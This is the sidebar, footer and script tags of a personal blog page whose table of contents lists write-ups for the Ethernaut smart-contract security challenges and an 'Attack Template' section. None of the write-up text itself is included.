          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ethernaut-Challenges"><span class="nav-number">1.</span> <span class="nav-text">Ethernaut Challenges</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fallback"><span class="nav-number">1.0.1.</span> <span class="nav-text">Fallback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fal1out"><span class="nav-number">1.0.2.</span> <span class="nav-text">Fal1out</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CoinFlip"><span class="nav-number">1.0.3.</span> <span class="nav-text">CoinFlip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Telephone"><span class="nav-number">1.0.4.</span> <span class="nav-text">Telephone</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token"><span class="nav-number">1.0.5.</span> <span class="nav-text">Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Delegation"><span class="nav-number">1.0.6.</span> <span class="nav-text">Delegation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Force"><span class="nav-number">1.0.7.</span> <span class="nav-text">Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vault"><span class="nav-number">1.0.8.</span> <span class="nav-text">Vault</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#King"><span class="nav-number">1.0.9.</span> <span class="nav-text">King</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reentrancy"><span class="nav-number">1.0.10.</span> <span class="nav-text">Reentrancy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Elevator"><span class="nav-number">1.0.11.</span> <span class="nav-text">Elevator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privacy"><span class="nav-number">1.0.12.</span> <span class="nav-text">Privacy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GateKeeper1-and-2"><span class="nav-number">1.0.13.</span> <span class="nav-text">GateKeeper1_and_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NaughtCoin"><span class="nav-number">1.0.14.</span> <span class="nav-text">NaughtCoin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Preservation"><span class="nav-number">1.0.15.</span> <span class="nav-text">Preservation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Recovery"><span class="nav-number">1.0.16.</span> <span class="nav-text">Recovery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MagicNumber"><span class="nav-number">1.0.17.</span> <span class="nav-text">MagicNumber</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AlienCodeX"><span class="nav-number">1.0.18.</span> <span class="nav-text">AlienCodeX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Denial"><span class="nav-number">1.0.19.</span> <span class="nav-text">Denial</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shop"><span class="nav-number">1.0.20.</span> <span class="nav-text">Shop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dex"><span class="nav-number">1.0.21.</span> <span class="nav-text">Dex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dex2"><span class="nav-number">1.0.22.</span> <span class="nav-text">Dex2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Puzzle-Wallet"><span class="nav-number">1.0.23.</span> <span class="nav-text">Puzzle Wallet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Motorbike"><span class="nav-number">1.0.24.</span> <span class="nav-text">Motorbike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DoubleEntryPoint"><span class="nav-number">1.0.25.</span> <span class="nav-text">DoubleEntryPoint</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Template"><span class="nav-number">1.1.</span> <span class="nav-text">Attack Template</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Yu4n</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yu4n</span>
</div>
<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>
-->


 

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
